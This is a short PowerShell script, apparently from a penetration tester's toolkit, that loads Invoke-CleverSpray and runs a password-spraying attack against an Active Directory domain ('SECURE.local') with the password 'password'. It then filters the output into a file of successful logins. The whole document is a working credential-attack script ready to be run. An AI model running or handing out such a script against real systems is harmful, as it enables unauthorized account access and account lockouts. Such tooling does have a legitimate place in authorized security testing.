
<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "SECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_clever.ps1

#>

#$global:target=$args[0]

function run-clever {

Import-Module .\Invoke-CleverSpray.ps1

#$userlist =  "users.txt"
#$userlist =  "C:\Windows\Temp\dusers.txt"

# Custom Password List 
$passlist = "pass100.txt"


write-host "===========================[ Invoke-CleverSpray: password ]==========================="
Invoke-CleverSpray -Password "password" | tee clever_brute.txt
Get-Content .\clever_brute.txt | findstr "Success:" | sort-object| Get-Unique > clever_brute_cracked.txt
write-host "================================================================"


date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content clever_brute_cracked.txt
}


run-clever




